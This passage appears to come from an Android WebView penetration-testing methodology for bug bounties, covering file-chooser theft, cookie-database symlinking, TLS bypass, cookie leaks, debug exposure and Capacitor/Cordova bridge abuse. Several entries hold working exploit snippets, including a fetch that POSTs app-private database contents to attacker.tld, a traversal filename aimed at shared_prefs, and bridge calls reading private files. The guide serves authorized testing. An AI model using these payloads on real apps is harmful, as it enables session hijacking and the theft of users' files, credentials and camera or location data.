| **Attacker** | AM-03 (malicious app registering a high-priority picker) |
| **Applies to** | all WebViews that enable file upload |
| **Maps to** | Oversecured WebView checklist §12 ("theft of arbitrary files"); `WebChromeClient.java` ("WebView does not enforce restrictions on the chosen file") |

- **Test:** `onShowFileChooser` fires an implicit `GET_CONTENT` via `createIntent()`; if `onActivityResult` passes
  `data.getData()` straight to `filePathCallback.onReceiveValue` with no scheme/path check, a malicious picker that
  outranks the system one returns a victim-internal `file://` URI, which the WebView then uploads.
- **How:**
  ```bash
  grep -rn 'onShowFileChooser' jadx_out/sources -A20
  grep -rn 'onReceiveValue' jadx_out/sources -B10 | grep -n 'onActivityResult'
  ```
  Attacker picker (Oversecured shape): a priority-999 `GET_CONTENT`+`OPENABLE` activity doing
  `setResult(-1, new Intent().setData(Uri.parse("file:///data/user/0/com.victim/shared_prefs/secrets.xml")))`.
- **Proof:** The victim's own WebView uploads its private `secrets.xml` (observe the multipart body in the proxy or on
  your server).
- **Escalation:** Combine with a WebView you can point at your own origin (D10-016+) so the upload target is yours →
  D11/D13.
- **Ruled out when:** the returned URI's scheme/path is validated and `file://` inside the app sandbox is rejected
  before `onReceiveValue`.

### D10-038 · Symlink the WebView cookie DB into a `file://` render path (no-root session theft)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | apps with `setAllowFileAccess(true)` (default < targetSdk 30) + a `file://` load path |
| **Maps to** | H1 #532836 (Exness) — no root required |

- **Test:** Combining a `file://` render path with a symlink turns "XSS in a WebView" into "exfiltrate the raw cookie
  database".
- **How:**
  ```java
  Runtime.getRuntime().exec("ln -s /data/data/com.victim/app_webview/Default/Cookies /data/data/pwn.pwn/pwn.html").waitFor();
  Runtime.getRuntime().exec("chmod 777 -R /data/data/pwn.pwn/").waitFor();
  new File("/data/data/pwn.pwn/pwn.html").setReadable(true, false);
  // then get the victim's WebView to load file:///data/data/pwn.pwn/pwn.html
  ```
- **Proof:** The contents of the victim's `Cookies` SQLite file on your server, parsed to show live session cookies.
- **Escalation:** → D11/D13; combine with D10-022 for the render path.
- **Ruled out when:** `setAllowFileAccess(false)` (or targetSdk ≥ 30 default) and no `file://` load path — the symlink
  is then unreadable through the WebView.

### D10-039 · `onReceivedSslError` calling `handler.proceed()` (WebView TLS bypass)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (VARIES, CWE-319) — the one TLS finding NOT downgraded to a pinning complaint |
| **Attacker** | AM-06 (network attacker, no trusted CA) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0284, MASWE-0027 (CWE-295/297); `WebViewClient.java` ("never proceed past errors"); MobSF `android_webview_ignore_ssl` |

- **Test:** An `onReceivedSslError` implementation that calls `handler.proceed()` (or prompts and proceeds) disables
  certificate validation for all WebView traffic — regardless of the app's NSC or OkHttp pinning.
- **How:**
  ```bash
  grep -rn -A15 'onReceivedSslError' jadx_out/sources | grep -n 'proceed()'
  ```
  Confirm with an untrusted CA that is **not** installed on the device (installing it would mask the bug). Runtime hook
  (`WebViewClient` is a *concrete* class, so this fires):
  ```javascript
  Java.use('android.webkit.WebViewClient').onReceivedSslError.implementation = function (v, h, e) {
    console.log('[sslError] '+e+' url='+v.getUrl()); return this.onReceivedSslError(v, h, e);
  };
  ```
- **Proof:** The WebView renders content through the untrusted-CA proxy with no warning, and Burp shows the plaintext
  request/response including at least one `Authorization`/`Cookie` header you decrypted — this matches HackerOne's
  Platform Standards "improper certificate validation" High rating (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`).
- **Escalation:** Decrypted session token → D13/D15; inject JS into the MitM'd page → D10-004.
- **Ruled out when:** every `onReceivedSslError` path calls `cancel()` (or `super`) and none proceeds — including the
  weak variants: deciding on `getPrimaryError()` alone, or catching an exception without calling `cancel()`.

### D10-040 · `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via injected script → token; the config alone is a P5 misconfiguration |
| **Attacker** | AM-06 |
| **Applies to** | permissive default is targetSdk ≤ 19; from targetSdk 21 default is NEVER_ALLOW (explicit call required) |
| **Maps to** | MASTG-TEST-0284, `WebSettings.java` mixed-content constants; MobSF `android_webview_mixed_content` (CWE-319) |

- **Test:** `MIXED_CONTENT_ALWAYS_ALLOW` (0) lets an HTTPS page pull HTTP subresources; a network attacker then
  injects script into the HTTPS origin without breaking TLS on the main document.
- **How:**
  ```bash
  grep -rn 'setMixedContentMode' jadx_out/sources     # confirm ALWAYS_ALLOW at runtime (0) via D10-001
  ```
  MITM only the HTTP subresources and inject a `<script>`.
- **Proof:** Injected script executing on the HTTPS origin (`document.domain` beacon to your server).
- **Escalation:** Script in the app's web origin → D10-004 bridge → token → ATO. Gate the severity on the program's
  MitM stance first (some treat AM-06 as required precondition).
- **Ruled out when:** the mode is `MIXED_CONTENT_NEVER_ALLOW` (default from targetSdk 21) and not overridden, or the
  WebView loads only local content.

### D10-041 · MitM-injected JS into an `http://` WebView page (LEGACY — needs a stated precondition)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | depends on the origin reached; not reproducible on a modern target without a precondition |
| **Attacker** | AM-06 |
| **Applies to** | LEGACY — cleartext blocked by default from targetSdk 28 |
| **Maps to** | local corpus field-tooling additions; `usesCleartextTraffic`/NSC |

- **Test:** Any 2014–2016-style PoC that MitM-injects JS into an `http://` page in a WebView needs a reachability
  precondition on modern Android. State which of these you used: (a) an NSC `cleartextTrafficPermitted` domain, (b) an
  `http://` URL reachable via an exported deep link / arbitrary-URL-load, or (c) an existing XSS on the loaded origin.
- **How:**
  ```bash
  grep -n 'usesCleartextTraffic\|networkSecurityConfig' AndroidManifest.xml ; cat res/xml/network_security_config.xml 2>/dev/null
  grep -rn "loadUrl(\"http://\|loadUrl('http://" jadx_out/sources
  ```
- **Proof:** The cleartext request in the proxy plus the NSC entry or the deep link that produced it; then the injected
  script executing.
- **Escalation:** → D10-004 bridge (an ad/analytics SDK WebView over cleartext is the common live case — D10-066).
- **Ruled out when:** targetSdk ≥ 28 with no `usesCleartextTraffic="true"` and no permissive NSC domain, and no
  `http://` load path exists — the PoC is then not reproducible.

### D10-042 · `CookieManager.setCookie` to an unvalidated domain (cookie injection)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) — direct session-token delivery to the attacker origin |
| **Attacker** | AM-02 |
| **Applies to** | all (the cookie jar is shared, process-wide) |
| **Maps to** | Oversecured WebView checklist "Cookie Injection"; local corpus Class #24 |

- **Test:** `CookieManager.getInstance().setCookie(url, token)` with a non-constant `url` writes a sensitive cookie
  into the shared cookie jar for an unvalidated domain, or an app that sets the auth cookie for a URL *before*
  validating it delivers it to the attacker origin.
- **How:**
  ```bash
  grep -rn 'CookieManager.getInstance().setCookie(' jadx_out/sources    # non-constant URL argument
  ```
  Drive the WebView at an attacker origin first, then observe whether the app sets the auth cookie for it.
- **Proof:** `document.cookie` on the attacker origin contains the app's session cookie, and it persists / is sent on
  the next request to the attacker host.
- **Escalation:** → D13.
- **Ruled out when:** `setCookie` is only called for hardcoded validated hosts.

### D10-043 · Static / reused header map leaking cookies across origins

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | H1 #3475626 (LinkedIn, High 8.1, CWE-Misconfiguration) |

- **Test:** A WebView helper that stores the outgoing header map in a **static** field never clears it, so cookies
  gathered on origin A are sent on the extra-headers `loadUrl` to origin B.
- **How:** LinkedIn #3475626 shape:
  ```java
  ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS;   // static, never cleared
  if (s2 != null) arrayMap0.put("Cookie", CookieManager.getInstance().getCookie(s));
  this.webView.loadUrl(s, arrayMap0);
  ```
  ```bash
  grep -rn 'static.*\(Map\|ArrayMap\|HashMap\).*HEADER' jadx_out/sources
  grep -rn 'loadUrl(\w*,\s*\w*)' jadx_out/sources -B15 | grep -i cookie
  ```
- **Proof:** Load the first-party site in the fragment, then load your host in the same fragment, and show the
  `Cookie:` header with the app's session cookies in your access log. Reachability trick from #3475626: no deep link
  existed to the vulnerable fragment — the researcher reached it via a `javascript://` scheme bypass on a validated
  deep link, then a JS interface that navigated to the fragment.
- **Escalation:** → D13.
- **Ruled out when:** the header map is request-scoped and the `Cookie` header is only attached for the exact matching
  host.

### D10-044 · `setAcceptThirdPartyCookies` on the sign-in / OAuth / checkout WebView

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it enables session fixation / code interception on an OAuth endpoint |
| **Attacker** | AM-02 |
| **Applies to** | all; the setter exists from API 21 |
| **Maps to** | `CookieManager.setAcceptThirdPartyCookies` (gap-adversary corpus) |

- **Test:** `CookieManager.setAcceptThirdPartyCookies(webView, true)` re-enables cross-site cookies inside the app's
  browser. In an OAuth/SSO or embedded-checkout flow, an embedded attacker frame can read/set the IdP's/PSP's cookies,
  defeating the isolation the system browser gives the same flow.
- **How:**
  ```bash
  grep -rnE 'setAcceptThirdPartyCookies|setAcceptCookie' jadx_out/sources
  ```
  Confirm the live value with a Frida hook on `CookieManager.setAcceptThirdPartyCookies`, then from an iframe you
  control set and read a cookie for the IdP origin.
- **Proof:** Frida prints `true` for the login/checkout WebView, then the iframe sets/reads an IdP-origin cookie.
- **Escalation:** OAuth in an embedded WebView (not a Custom Tab) + third-party cookies = session-fixation/code
  interception → D13/D28.
- **Ruled out when:** third-party cookies are off (default) for the auth WebView, or the OAuth flow runs in a Custom Tab.

### D10-045 · Modern SameSite default (targetSdk 31) pushing the session token into a URL or bridge

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a token moves into a query string or bridge |
| **Attacker** | AM-02 |
| **Applies to** | targetSdk 31+ |
| **Maps to** | `about/versions/12/behavior-changes-12` (Modern SameSite cookies in WebView; devtools flag `webview-enable-modern-cookie-same-site`) |

- **Test:** At targetSdk 31, WebView treats no-`SameSite` cookies as `Lax` and requires `Secure` for `SameSite=None`.
  A backend session cookie set `SameSite=None` without `Secure` is now dropped in WebView — and the app may have
  "fixed" this by moving the token into a URL parameter or a `@JavascriptInterface` call.
- **How:**
  ```bash
  grep -rn 'SameSite' jadx_out/sources res/
  ```
  In Burp, inspect `Set-Cookie` on the in-WebView auth flow; A/B with the WebView DevTools flag
  `webview-enable-modern-cookie-same-site` (`adb shell am start -a com.android.webview.SHOW_DEV_UI`).
- **Proof:** Capture both the dropped `Set-Cookie` and the replacement carrier — the token appearing in a query string
  (logged by proxies, referer-leaked, in history) or a bridge call.
- **Escalation:** → D13 session theft; D10-004 bridge abuse.
- **Ruled out when:** the session cookie is `Secure; SameSite=None` (or the flow uses a Custom Tab) and no token is
  carried in a URL or bridge as a workaround.

### D10-046 · WebView storage not cleaned up on logout (eternal cookies)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4); higher if the extracted token is still server-valid |
| **Attacker** | AM-03 / AM-10 / AM-11 (needs file access or a shared/lost device) |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0320, MASWE-0001 (CWE-312/922); MASTG-TECH-0142/-0143; HackTricks README ("Eternal cookies") |

- **Test:** WebViews persist HTTP cache, DOM storage, IndexedDB, cookies and OPFS/SQLite-Wasm under
  `/data/data/<pkg>/app_webview/`. Verify data you entered — and the session cookie — is gone after logout and app close.
- **How:**
  ```bash
  # exercise login, then log out and close the app, then:
  adb shell run-as com.target ls -laR app_webview/Default/
  adb shell run-as com.target sqlite3 app_webview/Default/Cookies 'select host_key,name,value from cookies;'
  adb shell run-as com.target grep -ral '<token you entered>' app_webview/
  ```
  Coverage gaps to state: `clearCache(true)` clears only the HTTP cache; `WebStorage.deleteAllData()` clears DOM
  storage/WebSQL but **not** IndexedDB/OPFS; `removeAllCookies()` clears cookies; IndexedDB/OPFS need
  `clearApplicationUserData()`.
- **Proof:** A session cookie/JWT still present under `app_webview/` after an explicit in-app logout — then replay it
  against the API to show it still authenticates (that makes it a server session-invalidation finding too).
- **Escalation:** Recovered cookie → D10-012/D10-031 exfil primitive → D13/D15.
- **Ruled out when:** logout calls the correct cleanup for every enabled storage area and the extracted token no
  longer authenticates server-side.

### D10-047 · `setSavePassword` / `setSaveFormData` / DOM-storage / DB residue on disk

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) alone; High when a live token is recovered → D13 |
| **Attacker** | AM-03 / AM-11 |
| **Applies to** | `setSavePassword` is a no-op from API 18 (LEGACY); DOM-storage/cookie residue is current |
| **Maps to** | `WebSettings.java` deprecations; MASTG-TEST-0320; hackwithsingh sec-14-7 #5/#6/#12/#13/#14 |

- **Test:** Check `setSavePassword`, `setSaveFormData`, `setDatabaseEnabled`, `setDomStorageEnabled`, then look at what
  is actually written into the WebView data dirs (tokens in localStorage, WebSQL, form data).
- **How:**
  ```bash
  grep -rnE 'setSavePassword|setSaveFormData|setDatabaseEnabled|setDomStorageEnabled|setCacheMode|clearFormData' jadx_out/sources
  adb shell run-as com.target cat 'app_webview/Default/Local Storage/leveldb/'*.log | strings | grep -i token
  ```
- **Proof:** A bearer/session token recovered from Local Storage / WebSQL on disk.
- **Escalation:** → D11/D13; a persisted service-worker script → D17.
- **Ruled out when:** no sensitive value is written to WebView storage (DOM storage off or tokens kept out of it), and
  the deprecated setters are absent/no-ops.

### D10-048 · `loadUrl` without `loadUrlWithoutCookies` → session cookies sent to any host

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | all |
| **Maps to** | Niraj Kharel methodology (grep `loadUrl()` without `loadUrlWithoutCookies()`) |

- **Test:** Returning `false` from `shouldOverrideUrlLoading` (or not handling a scheme) lets the WebView navigate
  anywhere and keep the session cookies — cookies transmit by default unless the app uses a cookie-less load.
- **How:**
  ```bash
  grep -rn 'loadUrl(' jadx_out/sources | grep -v 'loadUrlWithoutCookies'
  ```
  Point the WebView at Burp Collaborator via a D09/D10 entry and read the headers it sends.
- **Proof:** Collaborator logs an inbound request carrying the app's `Cookie:`/`Authorization:` header, then exercise
  `/update/email`, `/update/profile` etc. with the captured session.
- **Escalation:** → D15 (act as the victim); rate on the strongest reachable action.
- **Ruled out when:** navigation is host-allow-listed and off-origin loads either use a cookie-less variant or never
  attach the app's cookies/headers.

### D10-049 · `setWebContentsDebuggingEnabled(true)` in a release build

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) via the exposed session; the config alone maps to P5 debug-mechanism |
| **Attacker** | AM-03 (any local process reaching the abstract socket) / AM-10/AM-11 (USB) |
| **Applies to** | all (KitKat+); works independently of the `debuggable` flag |
| **Maps to** | MASTG-TEST-0227, MASWE-0063 (CWE-489); `WebView.java`; Guardsquare (library globally enabling it) |

- **Test:** `setWebContentsDebuggingEnabled(true)` shipped in release (or enabled process-wide by a library) exposes
  every WebView to `chrome://inspect`. It is independent of `ApplicationInfo.FLAG_DEBUGGABLE` — even a non-debuggable
  app is affected.
- **How:**
  ```bash
  grep -rn 'setWebContentsDebuggingEnabled' jadx_out/sources -B4 -A2   # check for a FLAG_DEBUGGABLE / BuildConfig.DEBUG guard
  adb shell cat /proc/net/unix | grep -i webview_devtools
  adb forward tcp:9222 localabstract:webview_devtools_remote_$(adb shell pidof -s com.target)
  curl -s http://127.0.0.1:9222/json | jq -r '.[].url'
  ```
- **Proof:** The app's WebView listed in `chrome://inspect` on a **release-signed, non-debuggable** build
  (`aapt dump badging` shows no `debuggable`), then a console `document.cookie` / bridge call returning a real value.
- **Escalation:** DevTools access to a bridged WebView is direct native-method invocation with no malicious page
  needed (D10-004) → D13.
- **Ruled out when:** the call is guarded by `BuildConfig.DEBUG`/`FLAG_DEBUGGABLE`, absent in release, and no bundled
  library enables it process-wide (grep every namespace).

### D10-050 · `onPermissionRequest` auto-granting camera/microphone to web content

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1)-adjacent; covert capture — rate on demonstrated impact |
| **Attacker** | AM-02 |
| **Applies to** | all; `react-native-webview` and `unity-webview` grant by default if the app holds the permission |
| **Maps to** | `WebChromeClient.java` (`onPermissionRequest` default denies); SecWeb 2022 "The Bridge... is Still Broken" (5% of top-250 permission-requesting apps) |

- **Test:** The default `onPermissionRequest` denies. An override calling `request.grant(request.getResources())`
  unconditionally hands any loaded origin the app's camera/mic. Some frameworks grant by default when the app already
  holds the permission.
- **How:**
  ```bash
  grep -rn -A12 'onPermissionRequest\|PermissionRequest\|WebChromeClient' jadx_out/sources | grep -n '\.grant('
  ```
  From a page loaded in the WebView: `navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s=>...)`.
- **Proof:** `getUserMedia` resolves with live tracks and **no prompt** while the app already holds `CAMERA`/`RECORD_AUDIO`;
  capture a frame and POST it to your server (the received image is the proof).
- **Escalation:** Covert camera/mic capture attributed to the app → D20; one-click via D09.
- **Ruled out when:** `onPermissionRequest` grants only to a fixed first-party origin list (or is not overridden), and
  the WebView cannot be pointed at attacker content.

### D10-051 · `onGeolocationPermissionsShowPrompt` / `setGeolocationEnabled` auto-grant

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | precise-location disclosure to an attacker origin — rate on impact |
| **Attacker** | AM-02 |
| **Applies to** | all; `setGeolocationEnabled` defaults true; prompt fires only for secure origins |
| **Maps to** | `WebChromeClient.java`, `WebSettings.java`; hackwithsingh sec-14-7 #8 |

- **Test:** An override of `onGeolocationPermissionsShowPrompt` that calls `callback.invoke(origin, true, true)`
  silently and persistently grants location to whatever origin is loaded.
- **How:**
  ```bash
  grep -rn -A10 'onGeolocationPermissionsShowPrompt\|setGeolocationEnabled' jadx_out/sources | grep -n 'invoke('
  ```
- **Proof:** `navigator.geolocation.getCurrentPosition` returning real coordinates to your origin; POST them out.
- **Escalation:** → D20; one-click via D09.
- **Ruled out when:** the prompt is shown to the user or the callback grants only to fixed first-party origins, and
  attacker content cannot be loaded.

### D10-052 · Safe Browsing explicitly disabled

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `mobile_security_misconfiguration.*` (P5) alone; Medium as an aggravator with weak URL validation |
| **Attacker** | AM-02 |
| **Applies to** | WebView Safe Browsing on by default from Android 8.1 (API 27) |
| **Maps to** | MASTG-TEST-0399, MASWE-0035 (CWE-829); `risks/cross-app-scripting` (meta-data snippet) |

- **Test:** Disabled via manifest meta-data or in code (code takes precedence). Removes the platform's last backstop on
  a WebView that already loads untrusted URLs.
- **How:**
  ```bash
  grep -n 'android.webkit.WebView.EnableSafeBrowsing' AndroidManifest.xml
  grep -rn 'setSafeBrowsingEnabled(false)\|onSafeBrowsingHit' jadx_out/sources
  ```
- **Proof:** `<meta-data ... EnableSafeBrowsing android:value="false"/>` or `setSafeBrowsingEnabled(false)`; confirm
  `getSafeBrowsingEnabled()=false` at runtime and load a Safe-Browsing test URL with no interstitial.
- **Escalation:** Report alongside D10-020 as a single "no defence-in-depth on WebView navigation" item; raises the
  exploitability of every other D10 item.
- **Ruled out when:** Safe Browsing is enabled in both manifest and code, or the device is below API 27.

### D10-053 · `setDownloadListener` — attacker-chosen filename path traversal / cookie leak

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) for the write; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the cookie leak |
| **Attacker** | AM-02 |
| **Applies to** | apps with an in-app browser or any WebView that can navigate to attacker content |
| **Maps to** | no external identifier verified (corpus covers `shouldOverrideUrlLoading`/`shouldInterceptRequest`; `setDownloadListener` is otherwise absent) |

- **Test:** A WebView cannot download by itself; the app supplies a `DownloadListener` whose callback receives `url`,
  `contentDisposition` and `mimetype` **from the page**. Test for path traversal in the derived filename, overwriting
  of app-private files, and whether the app's cookies/`Authorization` attach to the attacker-chosen URL.
- **How:**
  ```bash
  grep -rnE 'setDownloadListener|onDownloadStart|guessFileName|URLUtil\.guessFileName|parseContentDisposition' jadx_out/sources
  ```
  Serve from your origin in the app's browser:
  ```
  Content-Disposition: attachment; filename="../../../../data/data/com.target/shared_prefs/auth.xml"
  ```
- **Proof:** `adb shell run-as com.target ls -la shared_prefs files` shows a file written outside the download dir (or
  an app-private file replaced); or Burp shows the download request carrying the app's session cookie to your host.
- **Escalation:** Arbitrary write → D17 config-poisoning/code-load; cookie leak → D13.
- **Ruled out when:** the filename is sanitised (basename only, no `../`), the download dir is public and separate, and
  the download request does not attach the app's cookies to off-origin URLs.

### D10-054 · Credential Manager invoked from WebView without origin verification

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | apps embedding `androidx.credentials` Credential Manager in WebView |
| **Maps to** | `identity/sign-in/credential-manager` (WebView integration; "proper origin verification is required"; passkeys bound via assetlinks.json) |

- **Test:** Credential Manager integrates with WebView and the docs are explicit that "when using WebView, proper
  origin verification is required". A WebView navigable to an attacker origin that still triggers `getCredential` for
  the app's RP ID is a credential/passkey-phishing primitive.
- **How:**
  ```bash
  grep -rn 'CredentialManager\|GetCredentialRequest\|GetPublicKeyCredentialOption\|GetPasswordOption\|allowedProviders' jadx_out/sources
  ```
  Navigate the WebView off-origin (deep link, open redirect, bridge) and attempt the credential flow; also check for a
  missing `allowedProviders` (lets any installed credential provider answer).
- **Proof:** The Credential Manager sheet appears for the legitimate RP while `WebView.getUrl()` (Frida-hooked) is on
  an attacker origin.
- **Escalation:** → D13 ATO.
- **Ruled out when:** the WebView performs assetlinks-backed origin verification before invoking Credential Manager,
  restricts `allowedProviders`, and cannot be navigated off-origin.

### D10-055 · Capacitor `/_capacitor_file_` arbitrary app-private file read

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 (needs script execution in the WebView) |
| **Applies to** | Capacitor Android (designed feature of the local server, not a CVE) |
| **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_FILE_START="/_capacitor_file_"`, `window.WEBVIEW_SERVER_URL`); `AndroidProtocolHandler.openFile()` |

- **Test:** Capacitor's local server maps any path starting `/_capacitor_file_` to `new FileInputStream(path)` — prefix
  stripped, **no containment check**. Any script in the WebView origin reads any file the app's UID can read.
- **How:** With script execution (XSS, off-origin nav, injected third-party script):
  ```javascript
  const base = window.WEBVIEW_SERVER_URL;                    // injected global
  fetch(base+'/_capacitor_file_/data/data/<pkg>/shared_prefs/CapacitorStorage.xml').then(r=>r.text()).then(console.log);
  fetch(base+'/_capacitor_file_/data/data/<pkg>/databases/<db>').then(r=>r.text())
       .then(t=>fetch('https://attacker.tld/x',{method:'POST',body:t}));
  fetch(base+'/_capacitor_content_/media/external/images/media/1');   // content:// through the same server
  ```
  ```bash
  grep -rn '_capacitor_file_\|_capacitor_content_' out/smali* out/sources 2>/dev/null | head
  ```
- **Proof:** HTTP 200 with the raw XML/SQLite bytes of an app-private file returned into the page and landing on your
  collector.
- **Escalation:** Read the auth token → D15 → ATO; content:// reads → D07. Report it as the impact multiplier on any
  WebView script-execution finding in a Capacitor app.
- **Ruled out when:** the app is not Capacitor, or no script-execution vector exists in the WebView (CSP tight,
  origins locked, no injected content) — the server is only reachable from within the WebView origin.

### D10-056 · Capacitor `/_capacitor_http_interceptor_` SOP bypass / SSRF-from-device

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1)-class read primitive; SSRF into internal hosts |
| **Attacker** | AM-02 |
| **Applies to** | Capacitor Android with the CapacitorHttp plugin (default in recent Capacitor) |
| **Maps to** | Capacitor `Bridge.java` (`CAPACITOR_HTTP_INTERCEPTOR_START`), `WebViewLocalServer.handleCapacitorHttpRequest()`, `plugin/CapacitorHttp.java` (`addJavascriptInterface(this,"CapacitorHttpAndroidInterface")`) |

- **Test:** `/_capacitor_http_interceptor_?u=<absolute-url>` performs the request **natively**, copying the page's
  request headers, so the WebView reads cross-origin bodies with no CORS check — from the device, with the app's cookie
  jar, and it can skip the pinning socket factory when `isDomainExcludedFromSSL` is true.
- **How:**
  ```javascript
  const base = window.WEBVIEW_SERVER_URL;
  fetch(base+'/_capacitor_http_interceptor_?u='+encodeURIComponent('https://internal-api.target.local/admin/users'),
        {headers:{'Authorization':'Bearer <stolen>'}}).then(r=>r.text()).then(console.log);
  console.log(typeof CapacitorHttpAndroidInterface);   // also a direct bridge object
  ```
- **Proof:** A cross-origin response body (a normal `fetch` would block) printed in the page, and the request observed
  arriving at the target host from the device IP.
- **Escalation:** Combine with D10-055 token theft to make authenticated internal requests; SSRF into unreachable hosts.
- **Ruled out when:** not Capacitor / CapacitorHttp not present, or no script-execution vector reaches the WebView.

### D10-057 · Capacitor `androidBridge.postMessage` plugin surface (+ `addJavascriptInterface` fallback)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for a plugin reaching code/file access; else the token/file paths |
| **Attacker** | AM-02 |
| **Applies to** | Capacitor Android |
| **Maps to** | Capacitor `MessageHandler.java` (`addWebMessageListener(..., "androidBridge", allowedOriginRules, ...)`, falls back to `addJavascriptInterface(this,"androidBridge")` on exception or `android.useLegacyBridge`); `PluginManager.parsePluginsJSON()` |

- **Test:** Every registered Capacitor plugin method is invokable from JS by posting a JSON message. Enumerate the
  plugin list, then call the dangerous ones. Critically, the origin check only exists on the WebMessageListener path —
  the `addJavascriptInterface` fallback (`useLegacyBridge:true` or the catch branch) has **no origin restriction at all**.
- **How:**
  ```bash
  cat out/assets/capacitor.plugins.json     # exact plugin class list
  ```
  ```javascript
  Object.keys(Capacitor.Plugins);
  androidBridge.postMessage(JSON.stringify({ type:'message', callbackId:'1', pluginId:'Filesystem',
    methodName:'readFile', options:{ path:'/data/data/<pkg>/shared_prefs/prefs.xml', directory:'DOCUMENTS' }}));
  androidBridge.postMessage(JSON.stringify({ type:'cordova', callbackId:'2', service:'File', action:'readAsText', actionArgs:'[...]' }));
  ```
- **Proof:** A plugin response message carrying data (file contents, contacts, camera path, geolocation) returned to
  your injected script.
- **Escalation:** Plugin call = native capability in the app UID; pair with D09 off-origin nav for a fully remote chain.
- **Ruled out when:** the bridge is installed only via WebMessageListener with a fixed non-wildcard origin list, plugin
  execution is Main-Frame-only, `useLegacyBridge` is false, and no exception path drops to the unrestricted fallback.

### D10-058 · Cordova `_cordovaNative` / `gap:` prompt bridge and its bridge-secret gate

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) if `exec()` succeeds; High if only the bridge object is exposed off-origin |
| **Attacker** | AM-02 |
| **Applies to** | Cordova / Ionic-on-Cordova Android |
| **Maps to** | Cordova `SystemWebViewEngine.java` (`addJavascriptInterface(exposedJsApi,"_cordovaNative")`), `SystemExposedJsApi.java`, `CordovaBridge.java` (`verifySecret`, `promptOnJsPrompt`, `gap:`/`gap_init:`) |

- **Test:** Cordova exposes `exec()` via `_cordovaNative`, guarded by an integer `bridgeSecret` handed out only to a
  permitted origin via a `gap_init:` prompt. Verify the gate holds for off-origin content, and whether the prompt-based
  `gap:` path is reachable.
- **How:**
  ```javascript
  typeof _cordovaNative;   // defined => present
  _cordovaNative.exec(-1,'File','readAsText','cb','["file:///data/data/<pkg>/shared_prefs/x.xml"]');
  prompt('["<args>"]','gap:["<secret>","File","readAsText","cb"]');
  prompt('','gap_init:');   // returns the secret only from a permitted origin
  ```
  ```bash
  adb logcat | grep -i "Bridge access attempt with wrong secret token"
  ```
- **Proof:** A plugin result returned to script; or the logcat line "Bridge access attempt with wrong secret token,
  possibly from malicious code. Disabling exec() bridge!" — which itself proves the bridge object is reachable and
  which origin reached it.
- **Escalation:** File/camera/contacts via the plugin bridge → D07/D11/D20; combine with D10-060 wildcard.
- **Ruled out when:** the secret gate rejects off-origin `gap_init:`, the allow-list is exact-host, and `exec()`
  cannot be reached from attacker content.

### D10-059 · Cordova `AndroidInsecureFileModeEnabled` — one-preference universal file-read SOP bypass

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-02 |
| **Applies to** | Cordova-Android (LEGACY compatibility mode; should never ship) |
| **Maps to** | Cordova `SystemWebViewEngine.java` (`preferences.getBoolean("AndroidInsecureFileModeEnabled",false)` → `setAllowFileAccess(true)`+`setAllowUniversalAccessFromFileURLs(true)`) |

- **Test:** This preference switches the WebView back to a `file://` origin **and** sets `setAllowFileAccess(true)` +
  `setAllowUniversalAccessFromFileURLs(true)`. Any script in the WebView can then XHR any local file and any remote origin.
- **How:**
  ```bash
  grep -nE 'AndroidInsecureFileModeEnabled' out/res/xml/config.xml
  ```
  ```javascript
